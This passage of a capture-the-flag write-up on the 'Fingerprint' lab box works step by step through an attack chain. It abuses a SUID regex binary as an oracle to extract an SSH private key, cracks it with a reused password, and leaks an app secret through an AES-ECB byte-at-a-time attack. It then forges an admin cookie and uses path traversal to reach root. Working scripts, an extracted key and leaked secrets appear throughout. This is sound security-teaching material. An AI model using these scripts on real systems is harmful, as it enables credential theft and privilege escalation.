* HTTP 1.0, assume close after body
< HTTP/1.0 302 FOUND
< Content-Type: text/html; charset=utf-8
< Location: http://localhost:8088/login
< Content-Length: 0
< Server: Werkzeug/1.0.1 Python/2.7.17
< Date: Fri, 05 Nov 2021 10:52:48 GMT
< 
* Closing connection 0

```

The login that worked on 80:

```

www-data@fingerprint:/$ curl localhost:80/login -d 'username=admin&password=u_will_never_guess_this_password' -H "Content-Type: application/x-www-form-urlencoded"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/admin">/admin</a>.  If not click the link.

```

Doesn’t work on 8088:

```

www-data@fingerprint:/$ curl localhost:8088/login -d 'username=admin&password=u_will_never_guess_this_password' -H "Content-Type: application/x-www-form-urlencoded"
<html>
<head>

<link rel= "stylesheet" type= "text/css" href= "static/login.css">
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<body>

<title>Admin Login</title>
...[snip]...

```

I’ll come back to this later.

#### SUID

Looking at the SUID/SGID binaries, one immediately jumped out to me:

```

www-data@fingerprint:/$ find / -type f -perm -4000 -ls 2>/dev/null
   394617     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount
   393354     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
   393287     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   393338     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
   394616     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount
   395381     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   395374     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
      687    100 -rwsr-xr-x   1 root     root         100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
     5033    428 -rwsr-xr-x   1 root     root         436552 Aug 11 18:02 /usr/lib/openssh/ssh-keysign
    10631    116 -rwsr-xr-x   1 root     root         117880 Jun 15 10:45 /usr/lib/snapd/snap-confine
   395567     16 -rwsr-xr-x   1 root     root          14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
   394901     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
   395012     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
   394808     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
   395010     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
   394806     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
   395028     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
   393947    148 -rwsr-xr-x   1 root     root         149080 Jan 19  2021 /usr/bin/sudo
   395011     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
   394755     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
    56137   2212 -rwsr-sr-x   1 john     john        2261627 Sep 26 17:31 /usr/bin/cmatch
   395189     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   395048     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
   265291    204 -rwsr-xr-x   1 root     root         208376 Oct 16 02:20 /opt/google/chrome/chrome-sandbox

```

`/usr/bin/cmatch` is owned by john and runs as john.

### cmatch

#### Running It

Running it complains about the number of arguments:

```

www-data@fingerprint:/$ cmatch
Incorrect number of arguments!

```

I’ll add args until I find that two is the right number:

```

www-data@fingerprint:/$ cmatch a
Incorrect number of arguments!
www-data@fingerprint:/$ cmatch a a
open a: no such file or directory
www-data@fingerprint:/$ cmatch a a a
Incorrect number of arguments!

```

When I have two, it complains that it can’t open `a`. It’s looking for a file. When I change the first `a` to `/etc/passwd`, it returns:

```

www-data@fingerprint:/$ cmatch /etc/passwd a
Found matches: 61

```

It looks like it’s doing some kind of count of matches. Some additional testing confirms this:

```

www-data@fingerprint:/$ cmatch /etc/passwd aa
Found matches: 0
www-data@fingerprint:/$ cmatch /etc/passwd b 
Found matches: 51
www-data@fingerprint:/$ cmatch /etc/passwd john
Found matches: 3

```

The string `john` appears three times in `/etc/passwd`:

```

www-data@fingerprint:/$ grep john /etc/passwd
john:x:1000:1000:john:/home/john:/bin/bash

```

Trying with `bash` confirms:

```

www-data@fingerprint:/$ cmatch /etc/passwd bash
Found matches: 3
www-data@fingerprint:/$ grep bash /etc/passwd  
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
john:x:1000:1000:john:/home/john:/bin/bash

```

It looks to support regex too:

```

www-data@fingerprint:/$ wc /etc/passwd
  32   41 1642 /etc/passwd
www-data@fingerprint:/$ cmatch /etc/passwd '.'
Found matches: 1610

```

`.` doesn’t match `\n`, and there are 32 new lines in the file, and 1610 + 32 = 1642. I can match on `.` or `\n`, and get the every character in the file:

```

www-data@fingerprint:/$ cmatch /etc/passwd '(.|\n)'
Found matches: 1642

```

#### Find SSH Key

The first thing I wanted to look for is john’s private key. It’s there:

```

www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa a
Found matches: 19

```

I can confirm it’s got the typical format:

```

www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----'
Found matches: 2
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN'
Found matches: 1

```

The file has 1766 characters:

```

www-data@fingerprint:/dev/shm$ cmatch /home/john/.ssh/id_rsa '(.|\n)'
Found matches: 1766

```

#### Manual Brute SSH Key

I can start by using `^` to look at the start of a line, and start building a string from there one character at a time.

I can show the first line is 21 bytes long:

```

www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{20}'
Found matches: 1
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{30}'
Found matches: 0
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{25}'
Found matches: 0
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{22}'
Found matches: 0
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}'
Found matches: 1

```

Then I can add a newline, and keep looking:

```

www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n'
Found matches: 1
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n.'
Found matches: 1

```

The next line is 22 bytes long:

```

www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n.{40}'
Found matches: 0
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n.{30}'
Found matches: 0
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n.{20}'
Found matches: 1
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n.{25}'
Found matches: 0
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n.{22}'
Found matches: 1
www-data@fingerprint:/$ cmatch /home/john/.ssh/id_rsa '^-----BEGIN.{21}\n.{23}'
Found matches: 0

```

Just knowing the length isn’t enough. But it does show that I can build a string and test one character at a time.

For example, I’ll use this simple loop to look for the first character of the second line:

```

python -c "import string; print('\n'.join(string.ascii_letters))" 
| while read c; do 
    cmatch /home/john/.ssh/id_rsa "^-----BEGIN.{21}\n${c}" 
    | grep -qv "Found matches: 0" && echo $c; 
done

```

The Python command will print the ascii letters one per line. The `while` will read them into `c`, and then I’ll run `cmatch`. The result removes the string for no matches, and if something else if found (`grep` returns success), it will echo the character. It works!

```

www-data@fingerprint:/$ python -c "import string; print('\n'.join(string.ascii_letters))" | while read c; do cmatch /home/john/.ssh/id_rsa "^-----BEGIN.{21}\n${c}" | grep -qv "Found matches: 0" && echo $c; done 
P

```

The first character is P. I can add “P” to the regex and check the next characters:

```

www-data@fingerprint:/$ python -c "import string; print('\n'.join(string.ascii_letters))" | while read c; do cmatch /home/john/.ssh/id_rsa "^-----BEGIN.{21}\nP${c}" | grep -qv "Found matches: 0" && echo $c; done 
r
www-data@fingerprint:/$ python -c "import string; print('\n'.join(string.ascii_letters))" | while read c; do cmatch /home/john/.ssh/id_rsa "^-----BEGIN.{21}\nPr${c}" | grep -qv "Found matches: 0" && echo $c; done 
o

```

This is working, but it’s not going fast enough. I’ll need to script it.

#### SSH Brute Script

I started a simple Python script to try to read the entire key. At first, I included all `string.printable` in my script, but it kept breaking due to invalid escapes. I then thought about an SSH key. It has the base64 alphabet, plus newlines, and “-“ at the top and bottom. So I limited the alphabet to that. The script looked like:

```

#!/usr/bin/env python3

import string
import subprocess

alpha = string.ascii_letters + string.digits + ' -/+=\n,:'
known = "-----BEGIN"
print(known, end="")

while True:

    cont = False
    for c in alpha:
        if c in '+/':
            c = f'\\{c}'
        res = subprocess.check_output(f'cmatch /home/john/.ssh/id_rsa "{known}{c}"', shell=True)
        if b'Found matches: 0' not in res:
            print(c[-1], end="", flush=True)
            known = known + c
            cont = True
            break
    if not cont:
        break

```

It will start with a `while True:` loop, and set `cont` to `False`. Then it loops over each letter, checking if it is the next, and if so, it updates the `known` string, sets `cont = True` and breaks. On reaching the end of the `for` loop, if it didn’t find any matches, `cont` is false, and the while is broken. Otherwise, it found a character, which means it should loop looking for the next.

When I run this, it gets the start of the key:

```

www-data@fingerprint:/dev/shm$ python b.py        
-----BEGIN RSA PRIVATE KEY-----
Proc-Type

```

I didn’t take into account encrypted keys. They look something like:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D54228DB5838E32589695E83A22595C7

3+Mz0A4wqbMuyzrvBIHx1HNc2ZUZU2cPPRagDc3M+rv+XnGJ6PpThbOeMawz4Cbu
lQX/Ahbx+UadJZOFrTx8aEWyZoI0ltBh9O5+ODov+vc25Hia3jtayE51McVWwSXg
...[snip]...
-----END RSA PRIVATE KEY-----

```

I’ll add `:` and `,` to my alphabet and rerun:

```

www-data@fingerprint:/tmp$ python3 brute_ssh.py                   
-----BEGIN RSA PRIVATE KEY-----                                  
Proc-Type: 4,ENCRYPTED                                             
DEK-Info: AES-128-CBC,C310F9D86AE7CB5EA10046F9A215F423           
                                                                    
ysiTr753RYpx1qkFJRvge/Dtu7rMEocAuCchOzAUgw9MqyPuI5M9m6KTvdB2E+SC
KI8IlmSbAAu0obdwTOuKD0QDGCMlXadI91WKkhALiLuw0JsxuviTqkjy/xQOJYu+
T4VCRI8vZoc5lfGRXnVsOJmrfTWc8f43YSD+j8dOFvdkHi0ud7xSQfqKyhDVsRyO
6qM2v5RnBJBktl7vwftG5vyk5vZjmx2u5BXTksuBrMUF2iZVtsoQ59L70CtIXP0M
g5HV4QZWRhSlS++i8W0GnWzCGANwiS18Z6CR4noSw80huaCIqWfwnoTXGJx91IDM
S79dBUPaK109+DKXZfT600JriZ8S9yvox3QuQ9KwsqTP/Iz8NqQI/J5KLoivM+t4
DHjReKktYJQ+jLB1hA3CQDYs/kVUHdG2ThluFESVrnhJDvkyvKLxNlixighsb2+c
3JHnD8OvXOxrj2jl0k/DgbsfNxf3sHAl8snIiBwgEmb8Ep6CJOIQbuaPzqa2/Lxt
FWZlHwYGnieVxX67nNdcU+3xdfXbJX8UpYuGkKGwSiZRDHb3sMN5CtfHhU0fNybG
5xHn1YTwMZwHf8dKijdevMG2a8D79oaPff0XNflP+M2oz6e8RPOmkI0Wkv9EIq9X
IbLprBGDM8VQDHtO76u+l4DQZbMFCjCSjm+/xVtPmkCB7YhOyMOd5GqymGhxlbaS
OYJUBjA0TxHLtJ5+5rptyaIwnJ82CA0jjRI3hoGfk2PAkX9LJuonnRm3/Is2u02R
GoYnpegyKTp5ETL1Ut5BdEle1HrCTY5EjzI+e7bwXIEVhvgwS8e6W3ZUq72CC+gb
PkSbQSQXQDQ3/qEN0XkpFIa7gyB/GTKtlEwUSv/GxyB7lxu314/Nox7Bz32sxxsc
EwZURAAynFhVP+Bd7eB/ws/Ii2N9ENKk8ut8+9fKFw4/1pJDdwuof8MgdPImmEXZ
MPrQyMbt/7g1oAskxy3XgeuuRY76HN/p2tElyBDZ4K+XWikKAnQPNkaohfjqsTJX
VqPsWG2f8XxMnN6gRvWQ7eibbARdFU7c0KR3ANWgQ06ysCYp+R8F4ns4+nZzp2x1
DJpbS55UpW9r3cjcHHjfAoEmtI80waMKMpnTmwWyPqFGQiCVJvQkQBWKpmT/W8hU
dexiRjth+FOMmrUcFe1sSElNFHDcKj2TKxdPW97c/afLn3E/dUFDzalntY7K4A5M
O0F1a7M71yqaTsTEBglt1ZfVJUdogpz5rp2i77H5/gHV1/gIEwLwLkUchsFpS2kC
/ttPebUPv5Xxd/qMF4c8+Qaynn9+MAnbDPz7peYH2un2n103qI4PudCjdpGW23sb
UOtc0lgU4S2pA8rWT3j69nesVzR6Yni5zzj2gUL6o12+jdLoGYH6x6unlSf+EnEc
U1jQBBJReZQ82j+e1FhxvD6WclxpNrtZxZdSyYaaLOMyI618tvvn5X63AWoNAZoT
sq0H1EhWic++FzpFC1QjvmWlFIA8+KUt2BL0fz7RTQTfR0EGyZnZv9Dqe6QCneIE
U3tpTZByfgx+MI2LIM8GXjvhUOiM6DieB2OFWsR8JRyred2qFJOjz7fX5TUl9dQv
-----END RSA PRIVATE KEY-----

```

### Crack Key

#### john Fail

As far as I know, `hashcat` doesn’t crack private RSA keys. But `john` does. I’ll use `ssh2john` to create the hash:

```

oxdf@hacky$ ssh2john.py john_enc > id_rsa.hash 

```

Unfortunately, it doesn’t crack with `rockyou.txt`:

```

oxdf@hacky$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:03 DONE (2021-11-04 17:02) 0g/s 4717Kp/s 4717Kc/s 4717KC/s *7¡Vamos!
Session completed. 

```

#### Previous Passwords

I have the port 80 admin password, the signing secret, and the db password from the glassfish app, so I’ll try those. The admin password and signing secret don’t work:

```

oxdf@hacky$ openssl rsa -in fingerprint_john_enc > fingerprint_john
Enter pass phrase for fingerprint_john_enc:
unable to load Private Key
140490283394368:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:../crypto/evp/evp_enc.c:610:
140490283394368:error:0906A065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:461:

```

But the DB password did:

```

oxdf@hacky$ openssl rsa -in fingerprint_john_enc > fingerprint_john
Enter pass phrase for fingerprint_john_enc:
writing RSA key

```

### SSH

That key now works to get SSH as john:

```

oxdf@hacky$ ssh -i ~/keys/fingerprint_john john@10.10.11.127
...[snip]...
john@fingerprint:~$ 

```

And I can get `user.txt`:

```

john@fingerprint:~$ cat user.txt
f412fff3************************

```

## Shell as root

### Enumeration

#### Homedir

There’s nothing interesting in john’s homedir beyond `user.txt`. I’ve already got the `id_rsa` file. Otherwise, it’s pretty empty.

#### Services

It’s worth looking at the various services on the box to see what’s going on:

```

john@fingerprint:/etc/systemd/system$ ls *.service
dbus-org.freedesktop.resolve1.service  dbus-org.freedesktop.thermald.service  flask-beta.service  flask.service  glassfish.service  iscsi.service  sshd.service  syslog.service  vmtoolsd.service

```

`flask.service` and `flask-beta.service` control the server on 80 and 8088 respectively.

`flask.service` shows it is running from `/home/flask/app` and creating the service on port 80 running as the flask user:

```

[Unit]
Description=flask app
After=network.target

[Service]
User=flask
WorkingDirectory=/home/flask/app
ExecStart=/usr/local/bin/flask run --host=0.0.0.0 --port=80
Restart=always

[Install]
WantedBy=multi-user.target

```

`flask-beta.service` is running from `/root/flask-app-secure` on port 8088, and as no user is specified, it likely running as root:

```

[Unit]
Description=flask app
After=network.target

[Service]
WorkingDirectory=/root/flask-app-secure/
ExecStart=/usr/local/bin/flask run --host=0.0.0.0 --port=8088
Restart=always

[Install]
WantedBy=multi-user.target

```

#### Owned Files

When I get access as a second user, it’s always useful to look for files that that user can access that perhaps the previous user can’t. john’s only group is john, so I’ll start with that. The initial query has some noise in it, so I’ll triage and use `grep` to remove things I’m not interested in:

```

john@fingerprint:/$ find / -type f -group john 2>/dev/null | grep -v -e '^/proc' -e '^/home/john' -e '^/sys' -e '^/var/lib'
/usr/bin/cmatch
/var/backups/flask-app-secure.bak

```

I’ve already abused the `cmatch` binary. `/var/backups/flask-app-secure.bak` seems potentially interesting. It’s a Zip archive:

```

john@fingerprint:~$ file /var/backups/flask-app-secure.bak
/var/backups/flask-app-secure.bak: Zip archive data, at least v1.0 to extract

```

I’ll copy that file to my host using `scp` with john’s key.

#### Beta Flask

I’ll use SSH tunneling to get access to the web application running on 8088. Using the cookie from XSS way earlier, I tried to access `/admin`, but I’m just redirected to `/login`.

### New App Analysis

#### Files

The zip has some changes compared to the original app:

```

oxdf@hacky$ ls
app.py  auth.py  improvements  __init__.py  static  templates

```

On Fingerprint (with `.pyc` files removed for readability):

```

john@fingerprint:/home/flask/app$ ls
app.py  auth.py  __init__.py  static  templates  users.db  util.py

```

The database file and `util.py` (which was used to build a DB query) are gone. There’s an `improvements` file:

```

[x] fixed access control flaw
[x] introduced authorization
[x] safe authentication with custom crypto

```

This matches up with what I observed earlier in that I couldn’t access `/admin` without logging in like on port 80.

#### Auth

At this point it’s worth looking at how users are authenticated in the new app. I’ll start with the route for `/login`:

```

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == 'POST':
        user = do_auth()
        if user:
            e = user[0].encode("utf-8") + "," + SECRET + "," + ("true" if user[2] else "false" )

            print("setting cookie to "+ e)
            resp = make_response()
            resp.set_cookie("user_id", value=encrypt(e))
            resp.headers['location'] = url_for('admin')
            return resp, 302

    return show_login()

```

A non-POST request just returns the `show_login()` results, a function that renders and returns that form. The POST request calls `do_auth()`. Looking at that function, it just gets a the username and password from the form data and calls `check(user, password)`. `check` was imported from `.auth`, which means `auth.py` in the same directory. This function makes a call to the DB (it’s still using SQLite), and then returns the username, password, and admin flag:

```

import sqlite3

def check(user, password):

    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    cursor.execute("select username,password,admin from users where username = ? and password = ?", (user, password))

    rows = cursor.fetchall()

    for x in rows:
       return x

    return None

```

Back in `/login`, it takes the result and creates `e` in the format `{username},{SECRET},{true|false}`.

The result of `encrypt(e)` is set as the `user_id` cookie.

There’s a `@before_request` function called `load_user`. This function will run before any other route:

```

@app.before_request
def load_user():
    uid = request.cookies.get('user_id')

    try:
        g.uid = decrypt(uid)
        print("decrypted to " + g.uid)
        split = g.uid.split("," + SECRET + ",")
        if g.uid:
            g.name = split[0]
            g.is_admin = split[1] == "true"
    except Exception as e:
        print(str(e))

```

It’s going to try to get the cookie, decrypt it, split on `,{SECRET},`, storing the first result as the username and the second as a boolean to represent if the user is an admin.

`SECRET` is defined at the top of the code, but the comment suggests it will have been changed:

```

# todo: use stronger passphrase before running app
SECRET = "password"
KEY = "mykey"

```

#### Encryption

There are two encryption methods, `encrypt` and `decrypt`.

```

cryptor = AES.new(KEY, AES.MODE_ECB)

def decrypt(data):
    result = cryptor.decrypt(data.decode("hex"))
    pad_len = ord(result[-1])
    return result[:-pad_len]

def encrypt(data):
    # do some padding
    block_size = 16
    pad_size = block_size - len(data) % block_size
    padding = chr(pad_size) * pad_size
    data += padding
    return cryptor.encrypt(data).encode('hex')

```

On startup, it will create an `AES` object using the key, and the electronic code book (ECB) mode. In ECB, each block is encrypted independent of the other blocks:

![ECB encryption.svg](https://0xdfimages.gitlab.io/img/1920px-ECB_encryption.svg.png)

The block size is 16, and there’s always between 1 and 16 bytes of padding, and the padding bytes are the pad length (ie `\x01`, `\x02\x02`, `\x08\x08\x08\x08\x08\x08\x08\x08`, etc).

#### /profile

There’s a new interesting incomplete endpoint on the app, `/profile`.

```

# todo
@app.route("/profile", methods=["POST"])
def profile_update():

    if not hasattr(g,"uid") or not hasattr(g,"is_admin"):
        resp = make_response()
        resp.headers['Location'] = '/login'
        return resp, 302

    new_name = request.form.get('new_name')
    print(new_name)
    if not new_name or len(new_name) == 0:
        return "Error"

    e = new_name + "," + SECRET + "," + ("true" if g.is_admin else "false" )
    new_cookie = encrypt(e)

    resp = make_response()
    resp.headers['location'] = url_for('admin')
    resp.set_cookie("user_id", value=new_cookie)

    return resp, 302

```

Right now it looks like it takes a new name, updates the cookie, and returns it.

### Strategy

The goal here is to combine three vulnerabilities to get arbitrary read through the beta Flask server as root. To do this, I’ll leak the `SECRET` by abusing properties of ECB encryption. With the secret, I can create a username with `0xdf,{SECRET},true`, so that when it goes into the cookie, it’ll be `0xdf,{SECRET},true,{SECRET},false`, and then when it’s split on `,{SECRET},`, the first item will be `0xdf`, and the second will be `true`, and I’ll have admin access. Finally, with admin access, I’ll use the path traversal to read anywhere on the system.

### Leak SECRET

#### Strategy

If I set my username to one less than the blocksize, then the first block going into the ECB will be `AAAAAAAAAAAAAAA?`, where the last byte is unknown (actually, I know it’ll be `,` from the source, but let’s say I don’t). I’ll get back a cookie, and look at the last byte of the first block.

Then I can try up to 256 more requests, with each possible value for that last byte. One of these will produce a cookie with the same first block as the original cookie. That byte will be the correct byte.

I can then repeat that with a new username, this time 14 A followed by the correct byte from the last round, and then try all 256 again doing the same comparison. Like this, I can get the entire first block. Once I have that, I can do that same thing with the second block.

I’ll do a toy example with a 4 byte block size. Let’s say the server is appending “secret” to the username before encryption.

So that I don’t have to send an empty username, I’ll use one block-size of padding at the front.

For the first byte, I’ll send `aaaaAAA` and get a cookie. Then I’ll test with `aaaaAAA?` (where ? is all possible characters) until I find a match. When I send `AAAs`, the second block of the cookies will match.

Second byte, I’ll send `aaaaAA` and get a reference cookie. The server will create a cookie using `aaaaAAsecret`, but the second block of the cookie only depends on `AAse`. So I’ll test with `aaaaAAe?` until I get a match of the second four bytes (8 characters) of cookie.

Third byte, I’ll send `aaaaA` and get a reference cookie. The server will use `aaaaAsecret`, and the second block of the cookie will depend on `Asec`. I’ll test with `aaaaAse?` until I find c.

Forth byte, I’ll send an empty username, which is where the padding comes in (if I didn’t have it, the server would return an error). I’ll send `aaaa`, the cookie will be made from `aaaasecret`. The second block will only depend on `secr`, of which I already know `sec`, so I’ll test with `aaaasec?` until I find `r`.

For the next block, I’ll get the same cookie I got at the start of the first block, sending `aaaaAAA`. The server will create a cookie from `aaaaAAAsecret`. I’m going to be looking at the third block now, so what comes from `ecre`. I already know `ecr`, so I’ll test with `aaaaAAAsecr?`, until I find “e”.

The next byte just take away on A, so `aaaaAA`. The server will create `aaaaAAsecret`. The third block will be based on `cret` , and I already know `cre`. So I’ll brute force with `aaaaAAsecre?` to find the “t”.

On the next byte, because I’m looping over characters, it won’t find a valid match, because it’ll be in the padding. I can just exit now.

#### Manual

I’ll use the cookie from the XSS earlier to interact with the `/profile` endpoint. I’ll start with a new username of `AAAAAAAAAAAAAAA`.

```

oxdf@hacky$ curl -v 'http://localhost:8088/profile' -d "new_name=AAAAAAAAAAAAAAA" -H "Cookie: user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb03385506
35d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb"
*   Trying ::1:8088...
* TCP_NODELAY set
* Connected to localhost (::1) port 8088 (#0)
> POST /profile HTTP/1.1
> Host: localhost:8088
> User-Agent: curl/7.68.0
> Accept: */*
> Cookie: user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb
> Content-Length: 24
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 24 out of 24 bytes
* Mark bundle as not supporting multiuse
* HTTP 1.0, assume close after body
< HTTP/1.0 302 FOUND
< Content-Type: text/html; charset=utf-8
< Location: http://localhost:8088/admin
< Set-Cookie: user_id=465e4ae35723e1d942eb8e5582f0abf61b6f5fa845516c1d064937d029b471bd7aebcf474d98a46c01fd0dae983501242cbf5b00a2b8f3c89a9c62ce1dbe19d06141680349257570201be259d44cd314; Path=/
< Content-Length: 0
< Server: Werkzeug/1.0.1 Python/2.7.17
< Date: Fri, 05 Nov 2021 16:16:02 GMT
< 
* Closing connection 0

```

With some `grep` and `cut`, I can isolate the first block of the new cookie:

```

oxdf@hacky$ curl -sv 'http://localhost:8088/profile' -d "new_name=AAAAAAAAAAAAAAA" -H "Cookie: user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb" 2>&1 | grep "Set-Cookie" | cut -d= -f2 | cut -c -32
465e4ae35723e1d942eb8e5582f0abf6

```

When I add an “x” to the end of the username, the entire first block changes:

```

oxdf@hacky$ curl -sv 'http://localhost:8088/profile' -d "new_name=AAAAAAAAAAAAAAAx" -H "Cookie: user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb" 2>&1 | grep "Set-Cookie" | cut -d= -f2 | cut -c -32
b7db6d3cdf03fa2b79c3eeb351f06ed3

```

But when I add a “,” to the end, it matches the first:

```

oxdf@hacky$ curl -sv 'http://localhost:8088/profile' -d "new_name=AAAAAAAAAAAAAAA," -H "Cookie: user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb" 2>&1 | grep "Set-Cookie" | cut -d= -f2 | cut -c -32
465e4ae35723e1d942eb8e5582f0abf6

```

So basically I set up so that I knew all but the last character in the block. Then by testing all possible characters for that position, I can find the one that makes it match.

#### Python

This script will leak the key:

```

#!/usr/bin/env python3

import requests
import string
import sys

def get_cookie(username):
    resp = requests.post('http://127.0.0.1:8088/profile',
            data={"new_name": username},
            cookies=legit_cookie,
            proxies={"http":"http://127.0.0.1:8080"},
            allow_redirects=False)
    return resp.cookies.get('user_id')

legit_cookie = {"user_id": "49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb"}
block_size = 16
plaintext = ""
block = 1

# start loop over blocks, will break at end
while True:

    for i in range(block_size-1, -1, -1):
        username = (block_size + i) * "A"
        cookie = get_cookie(username)

        found = False
        for j in string.printable[:-5]:
            print(f"\r{plaintext}{j}", end="")
            test_username = b"A" * (i + block_size) + plaintext.encode() + j.encode()
            test_cookie = get_cookie(test_username)
            if test_cookie[2*block_size*block:2*block_size*(block+1)] == cookie[2*block_size*block:2*block_size*(block+1)]:
                plaintext += j
                found = True
                break
        if not found:
            print()
            sys.exit()

    block += 1

```

Running gives the secret:

```

oxdf@hacky$ python leak_secret.py 
,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,false 

```

### Get Admin Cookie

Now that I have this, I’ll create a username that looks like:

```

0xdf,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,

```

I’ll simulate what I expect the server to do in a Python shell:

```

>>> SECRET = "7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!"
>>> un = f"0xdf,{SECRET},true,{SECRET},"
>>> server_un = un + "," + SECRET + "," + "false"
>>> server_un.split("," + SECRET + ",")
['0xdf', 'true', '', 'false']

```

`un` is the username I submit. The server saves that as `server_un` in the cookie. When the cookie is decrypted, it splits, and checks gets the username and admin status from the first two things in the array (it only expects two). But I’ve put my “true” in the right place and pushed the real “false” back.

I’ll go into Burp Repeater and send a request to change my username:

[![image-20211105154015627](https://0xdfimages.gitlab.io/img/image-20211105154015627.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211105154015627.png)

The sent cookie is still the logged in cookie from XSS. The new cookie should be my malicious one.

I’ll add that to Firefox, and visit `/admin`:

![image-20211105154056071](https://0xdfimages.gitlab.io/img/image-20211105154056071.png)

### File Read

Back in repeater, I can get `root.txt`:

[![image-20211105154236665](https://0xdfimages.gitlab.io/img/image-20211105154236665.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211105154236665.png)

I can also get root’s SSH key:

[![image-20211105154328044](https://0xdfimages.gitlab.io/img/image-20211105154328044.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211105154328044.png)

### SSH

I can use that key to get a shell over SSH:

```

oxdf@hacky$ ssh -i ~/keys/fingerprint_root root@10.10.11.12
...[snip]...
root@fingerprint:~# 

```